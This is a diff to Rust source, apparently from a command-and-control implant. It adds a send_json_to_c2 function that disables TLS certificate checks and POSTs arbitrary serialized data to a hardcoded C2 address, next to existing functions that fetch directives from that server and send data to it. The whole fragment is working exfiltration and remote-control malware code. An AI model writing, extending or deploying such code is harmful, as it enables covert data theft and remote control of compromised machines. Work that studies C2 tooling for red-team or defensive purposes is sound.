@@ -1,6 +1,8 @@
+use anyhow::Result;
 use reqwest::Client;
 use reqwest::Error;
 use serde::Deserialize;
+use serde::Serialize;
 use std::fs::File;
 use std::io::prelude::*;
 use std::io::Read;
@@ -66,6 +68,21 @@ pub async fn get_directives() -> Result<Vec<String>, Error> {
         .collect();
 
     Ok(commands)
+}
+
+pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()?;
+
+    let _res = client
+        .post("https://172.28.161.20:3030/directives")
+        .header("Content-Type", "application/json")
+        .json(data)
+        .send()
+        .await?;
+
+    Ok(())
 }
 
 pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
